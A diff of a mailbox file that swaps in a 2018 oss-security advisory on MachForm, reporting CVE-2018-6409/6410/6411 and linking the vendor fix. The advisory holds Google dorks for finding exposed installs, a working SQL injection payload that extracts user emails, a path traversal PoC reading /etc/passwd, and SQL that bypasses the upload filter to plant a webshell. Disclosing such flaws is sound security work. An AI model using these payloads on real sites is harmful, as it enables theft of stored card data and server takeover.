@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2331" "Monday" "9" "October" "2017" "16:17:40" "-0400" "Stiepan" "stie@itk.swiss" "<oXx80JgYC6BjD_znKZs7JW2ithWRy0sZNy5FQelve1UwJsLmZWxJvIRVdS8HyQJee3Z59PxupDs022828NIklgHpmOyUTayvrNtaykmB_ww=@itk.swiss>" "43" "Re: [oss-security] Linux kernel CVEs not mentioned on oss-security" "^Cc:" nil nil "10" "2017100920:17:40" "[oss-security] Linux kernel CVEs not mentioned on oss-security" (number mark "        stie@itk.swi Oct  9   43/2331  " thread-indent "\"Re: [oss-security] Linux kernel CVEs not mentioned on oss-security\"\n") "<20171009131118.7d95c501@fabiankeil.de>" ("<EB502BBD-AA97-4FC5-A0E7-D148B0E33FF7@lanl.gov>" "<alpine.GSO.2.20.1709261217310.12755@scrappy.simplesystems.org>" "<CANO=Ty21NECXP_c4SiJ0ajbvi7wQFyA1RnyWeS0qu9e=sPQuYQ@mail.gmail.com>" "<4174873.rEhhimjYuO@wanheda>" "<CANO=Ty1M0XZw6DT39Lg7oa3sewknn3_WGWoFO3swMQf1UF3CvQ@mail.gmail.com>" "<20171009131118.7d95c501@fabiankeil.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4042" "Wednesday" "30" "May" "2018" "21:23:20" "+0200" "Amine Taouirsa" "taouirsa@gmail.com" "<CAOGhsh0gWVyfmXt1hUnxCC45KYRYAE0dfXu3xR_gufSJ3W8CHg@mail.gmail.com>" "116" "[oss-security] MachForm Multiple Vulnerabilities CVE-2018-6409/CVE-2018-6410/CVE-2018-6411" nil nil nil "5" "2018053019:23:20" "[oss-security] MachForm Multiple Vulnerabilities CVE-2018-6409/CVE-2018-6410/CVE-2018-6411" (number mark "U       taouirsa@gma May 30  116/4042  " thread-indent "\"[oss-security] MachForm Multiple Vulnerabilities CVE-2018-6409/CVE-2018-6410/CVE-2018-6411\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 9337 invoked by uid 550); 9 Oct 2017 22:05:35 -0000
+Received: (qmail 25717 invoked by uid 550); 30 May 2018 19:32:02 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,67 +11,156 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 19584 invoked from network); 9 Oct 2017 20:17:57 -0000
-Authentication-Results: mail1.protonmail.ch; dkim=none
-Message-ID: <oXx80JgYC6BjD_znKZs7JW2ithWRy0sZNy5FQelve1UwJsLmZWxJvIRVdS8HyQJee3Z59PxupDs022828NIklgHpmOyUTayvrNtaykmB_ww=@itk.swiss>
-In-Reply-To: <20171009131118.7d95c501@fabiankeil.de>
-References: <EB502BBD-AA97-4FC5-A0E7-D148B0E33FF7@lanl.gov>
- <alpine.GSO.2.20.1709261217310.12755@scrappy.simplesystems.org>
- <CANO=Ty21NECXP_c4SiJ0ajbvi7wQFyA1RnyWeS0qu9e=sPQuYQ@mail.gmail.com>
- <4174873.rEhhimjYuO@wanheda>
- <CANO=Ty1M0XZw6DT39Lg7oa3sewknn3_WGWoFO3swMQf1UF3CvQ@mail.gmail.com>
- <20171009131118.7d95c501@fabiankeil.de>
-Feedback-ID: wnsnnc8Us3MVqt1IALGduDJl-d16B_hEkg50pF7qo11mpeysEHmUOGy-yvw8MEApAPX3TXcPDHQwu7hti-kzSw==:Ext:ProtonMail
-MIME-Version: 1.0
-Content-Type: multipart/alternative;
-	boundary="b1_522399bc425c1edf333b9f796eb8db4f"
-Cc: kseifried@redhat.com
-Date: Mon, 09 Oct 2017 16:17:40 -0400
-From: Stiepan <stie@itk.swiss>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Linux kernel CVEs not mentioned on oss-security
-To: fk@fabiankeil.de, oss-security@lists.openwall.com
+Received: (qmail 17489 invoked from network); 30 May 2018 19:23:33 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=5JinmFSNQFhsBceXu1ixRS3I9i29qsfqRSsEk52cuFg=;
+        b=HPwa3FITDCk9PfcI/K+zUJnj7vncFG7uguR6K/E8fvkj7Y2uug+u1l830rS5hAEP/P
+         9ZAVhqpjjV3os8H/PsAWHYV72d2vi49xA4klBWbcG8K49oFNfXq4JTbw17uiuE4s8G89
+         ggv0W2SaOI+SPN/5j42gSqBUQHmakhvvqUlwYQCfOZypGzC8az/z4QRYbYMXachGymBE
+         9jY2xTH3rGqYV5xcb2Pm6TOwTnjHKKAPDVbnnRJUT421SbFqaOi6Uk7hB29Y54VslxNe
+         Q/i15JvdkWcSCP5myxoxWPvXc+rGreuyyYKORP4ES2NlqzCsbzksSedCa0p1ulccyrHJ
+         UPJQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=5JinmFSNQFhsBceXu1ixRS3I9i29qsfqRSsEk52cuFg=;
+        b=nyptvGibQTLZ/WBCel3Igd58RPeVWdvZkEB+Dh6EorfRarBn84k5EY2zYJBx7HmlHk
+         jpnIIGkvj8kLYdkFZxa4dX476RaV6O6xhszGzx1vOsx27XFJiEoPcA7r7jzvFPtlDnqO
+         Lx1yYW7vyHitOCaeKdrL9l8Vn5nbcRwNQ/wBhRMP4FAdW0nR4rGb6s+7Bw4yS8qM+cu8
+         7IVYW5cvRkx/z4WLZteKHbT8vzARcsYl5x2OTvXJxxqYfFMkrGW5rnFz1Y4adHI9/R6P
+         MKF60VqJIn0LprdLGM/BbXPmTQaabHv5uBV857wpYpWPEj5jzzHTQrX1A+O3NLNSwQci
+         ZO2A==
+X-Gm-Message-State: APt69E3g+iH1fHsADxHKgSXu+oCpt95u/QudHo2a23wlMF0QiYfoe7zc
+	m6n9e0KQErW5yWBpz2MwRyh5dhdOTKZZlCHbSg==
+X-Google-Smtp-Source: ADUXVKKP+//9UGCx7ScaEkUIipKYn1ZbH8aLXVDrbAulsvRfqHMjZwraXWjiJo0Fmcd+xEMwB8KO5b7CxuhyGVoqRH0=
+X-Received: by 2002:a0c:c342:: with SMTP id j2-v6mr3776598qvi.49.1527708201520;
+ Wed, 30 May 2018 12:23:21 -0700 (PDT)
+MIME-Version: 1.0
+From: Amine Taouirsa <taouirsa@gmail.com>
+Date: Wed, 30 May 2018 21:23:20 +0200
+Message-ID: <CAOGhsh0gWVyfmXt1hUnxCC45KYRYAE0dfXu3xR_gufSJ3W8CHg@mail.gmail.com>
+To: vuln@secunia.com, bugs@securitytracker.com, 
+	submissions@packetstormsecurity.org, bugtraq@securityfocus.com, 
+	oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="000000000000ac1260056d714806"
+Subject: [oss-security] MachForm Multiple Vulnerabilities CVE-2018-6409/CVE-2018-6410/CVE-2018-6411
 
---b1_522399bc425c1edf333b9f796eb8db4f
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: base64
+--000000000000ac1260056d714806
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-KzE7IGxldCdzIHVzZSBvdGhlciBpZGVudGlmaWVycyEgQW5kIHdoeSBub3Qs
-IGEgYmxvY2tjaGFpbiAoYmFzZWQgb24gYXQgbGVhc3QgU0hBMykgZm9yIHB1
-YmxpYyBzZWN1cml0eSBpc3N1ZXM/IFRoYXQgd291bGQgYmUgZ3JlYXQuIEFu
-ZCBhcyB0cnVzdGFibGUsIGFzIHRyYW5zcGFyZW50IGFzIGl0IG5lZWRzIHRv
-IGJlLgoKQW1lbgoKLS0tLS0tLS0gT3JpZ2luYWwgTWVzc2FnZSAtLS0tLS0t
-LQpPbiA5IE9jdCAyMDE3LCAxMzoxMSwgRmFiaWFuIEtlaWwgd3JvdGU6Cgo+
-IEt1cnQgU2VpZnJpZWQgIHdyb3RlOgo+Cj4+IElmIHlvdSBzZWUgdGhpczog
-UExFQVNFIFNVQk1JVCBUSEUgVVJMIEFTIEFOIFVQREFURSBUTyBUSEUgQ1ZF
-IFVTSU5HIFRIRQo+PiBDVkUgRk9STSAoeWVzLCBJIGFtIHNob3V0aW5nKS4K
-Pj4KPj4gaHR0cHM6Ly9jdmVmb3JtLm1pdHJlLm9yZwo+Cj4gQXMgeW91IHNl
-ZW0gdG8gYmUgInNob3V0aW5nIiBhIGxvdCBsYXRlbHksIEkganVzdCBsaWtl
-IHRvIHBvaW50IG91dAo+IHRoYXQgdXNpbmcgdGhlIE1JVFJFKCEpIGZvcm0g
-cmVxdWlyZXMgdGhlIGV4ZWN1dGlvbiBvZiBub24tZnJlZSBhbmQKPiB1bnNp
-Z25lZCBzb2Z0d2FyZSBmcm9tIHZhcmlvdXMgc291cmNlcy4KPgo+IFNvbWUg
-cGVvcGxlIGRvbid0IGNvbnNpZGVyIHRoaXMgYSBwcm9ibGVtLCBvdGhlcnMg
-ZG8uCj4KPj4gQ2hvb3NlICJSZXF1ZXN0IGFuIHVwZGF0ZSB0byBhbiBleGlz
-dGluZyBDVkUgZW50cnkiIGFuZCB0aGVuIGZvciAiVHlwZSBvZgo+PiB1cGRh
-dGUgcmVxdWVzdGVkIiBjaG9vc2UgIlVwZGF0ZSBSZWZlcmVuY2VzIiBhbmQg
-dGhlbiBlbmV0ZXIgdGhlIENWRSAjLAo+PiB0aGUgaWZvIGFuZCBVUkwgYW5k
-IGhpdCAiU3VibWl0IFJlcXVlc3QiCj4KPiAuLi4gdHJ1c3QgeW91ciBicm93
-c2VyJ3MgInNhbmRib3giIHRvIHdvcmsgYXMgYWR2ZXJ0aXNlZCBmb3IgYSBj
-aGFuZ2UKPiBhbmQgaWdub3JlIHRoZSBmYWN0IHRoYXQgeW91J3JlIHJ1bm5p
-bmcgcHJvcHJpZXRhcnkgc29mdHdhcmUgdGhhdCBtYXkKPiBvciBtYXkgbm90
-IGJlIGN1c3RvbWlzZWQganVzdCBmb3IgeW91ciBzeXN0ZW0gYW5kIGNhbid0
-IGJlIGVhc2lseQo+IGF1ZGl0ZWQgaW4gYWR2YW5jZS4KPgo+PiBUTDtEUjog
-RXZlcnlvbmUgd2FudHMgdGhlIGNhdCB0byB3ZWFyIGEgYmVsbCwgYW5kIGlu
-IHBhc3QgSSdsbCBhZG1pdCB3ZQo+PiAodGhlIENWRSBjb21tdW5pdHkpIGRp
-ZG4ndCBtYWtlIGl0IGVhc3kgdG8gY29udHJpYnV0ZS4gV2VsbCBub3cgd2Ug
-aGF2ZQo+PiBtYWRlIGl0IGVhc3kgdG8gY29udHJpYnV0ZSwgc28gcGxlYXNl
-IGRvLgo+Cj4gVEw7RFI6IE5vdCBldmVyeW9uZSB3YW50cyB0byBhbGxvdyBy
-ZW1vdGUgY29kZSBleGVjdXRpb24ganVzdCB0bwo+IHJlcXVlc3QgYSBDVkUu
-IFNvbWUgcGVvcGxlIGFyZSBzdWZmaWNpZW50bHkgc2F0aXNmaWVkIHdoZW4g
-c2VjdXJpdHkKPiBpc3N1ZXMgYXJlIGZvdW5kIGFuZCBmaXhlZCBpbiB0aW1l
-LiBXaGlsZSBDVkUgbnVtYmVyIGFyZSBzb21ldGltZXMKPiBuaWNlIHRvIGhh
-dmUsIG90aGVyIGlkZW50aWZpZXJzIHdvcmsganVzdCBhcyB3ZWxsIChmb3Ig
-c29tZSkuCj4KPiBGYWJpYW4gQHJlZGhhdC5jb20+
+ Vendor: Appnitro
+Product webpage: https://www.machform.com/
+Full-Disclose: https://metalamin.github.io/MachForm-not-0-day-EN/
+Fix: https://www.machform.com/blog-machform-423-security-release/
 
---b1_522399bc425c1edf333b9f796eb8db4f--
+Author: Amine Taouirsa
+Twitter: @metalamin
 
+Google dork examples:
+----------------------
+"machform" inurl:"view.php"
+"machform" inurl:"embed.php"
+
+Summary:
+---------
+The form creation platform MachForm from Appnitro is subject to SQL
+injections that lead to path traversal and arbitrary file upload.
+
+The application is widely deployed and with some google dorks it=E2=80=99s =
+possible
+to find various webpages storing sensitive data as credit card numbers with
+corresponding security codes. Also, the arbitrary file upload can let an
+attacker get control of the server by uploading a WebShell.
+
+[1] SQL injection (CVE-2018-6410):
+-------------------------
+
+[1.1] Description:
+The software is subject to SQL injections in the =E2=80=98download.php=E2=
+=80=99 file.
+
+[1.2] Parameters and statement:
+This SQLi can be found on the parameter =E2=80=98q=E2=80=99 which a base64 =
+encoded value
+for the following parameters:
+
+  $form_id  =3D $params['form_id'];
+  $id       =3D $params['id'];
+  $field_name =3D $params['el'];
+  $file_hash  =3D $params['hash'];
+
+
+So the injectable parameters are =E2=80=98el=E2=80=99 and =E2=80=98form_id=
+=E2=80=99 obtaining error-based,
+stacked queries and time-based blind SQL injections. This is due to the
+following vulnerable statement:
+
+  $query  =3D "select {$field_name} from `".MF_TABLE_PREFIX."form_{$form_id=
+}`
+where id=3D?";
+
+
+[1.3] POC
+Proof of concept to get the first user mail:
+  http:// [URL] / [Machform_folder] /download.php?q=3DZWw9IChTRUxFQ1
+QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgyMDIwLChTRUxFQ1
+QgTUlEKCh1c2VyX2VtYWlsKSwxLDUwKSBGUk9NIGFwX3VzZXJzIE9SREVSIE
+JZIHVzZXJfaWQgTElNSVQgMCwxKSwweDIwMjAsRkxPT1IoUkFORCgwKSoyKS
+l4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLkNIQVJBQ1RFUl9TRVRTIEdST1
+VQIEJZIHgpYSkgOyZpZD0xJmhhc2g9MSZmb3JtX2lkPTE=3D
+
+Which is the base64 encoding for:
+  el=3D (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x2020,(SELECT
+MID((user_email),1,50) FROM ap_users ORDER BY user_id LIMIT
+0,1),0x2020,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP
+BY x)a) ;&id=3D1&hash=3D1&form_id=3D1
+
+
+[2] Path traversal (CVE-2018-6409):
+-----------------------------------
+
+[2.1] Descrition
+download.php=E2=80=99 is used to serve stored files from the forms answers.
+Modifying the name of the file to serve on the corresponding ap_form table
+leads to a path traversal vulnerability.
+
+[2.2] POC
+First we need to change the name for the element on the form:
+update ap_form_58009 set element_4=3D"../../../../../../.
+./../../../../../../../../../etc/passwd" where id=3D1;
+
+Now in order to be able to download it, we need to access:
+  http:// [URL] / [Machform_folder] /download.php?q=3DZWw9NCZpZD0xJm
+hhc2g9NDAyYmEwMjMwZDZmNDRhMmRlNTkwYWMxMTEwN2E0NTgmZm9ybV9pZD01ODAwOQo=3D
+
+Which is the base64 encoding for;
+  el=3D4&id=3D1&hash=3D402ba0230d6f44a2de590ac11107a458&form_id=3D58009
+
+Note that hash is the MD5 of the corresponding filename:
+  md5("../../../../../../../../../../../../../../../../etc/passwd") =3D
+402ba0230d6f44a2de590ac11107a458
+
+[3] Bypass file upload filter (CVE-2018-6411):
+----------------------------------------------
+
+When the form is set to filter a blacklist, it automatically add dangerous
+extensions to the filters.
+If the filter is set to a whitelist, the dangerous extensions can be
+bypassed.
+
+This can be done directly on the database via SQLi
+update ap_form_elements set
+element_file_type_list=3D"php",element_file_block_or_allow=3D"a"
+where form_id=3D58009 and element_id=3D4;
+
+Once uploaded the file can be found and executed in the following URL:
+http:// [URL] / [Machform_folder] /data/form_58009/files/ [filename]
+
+The filename can be found in the database
+SELECT element_4 FROM ap_form_58009 WHERE id=3D1;
+
+--000000000000ac1260056d714806--
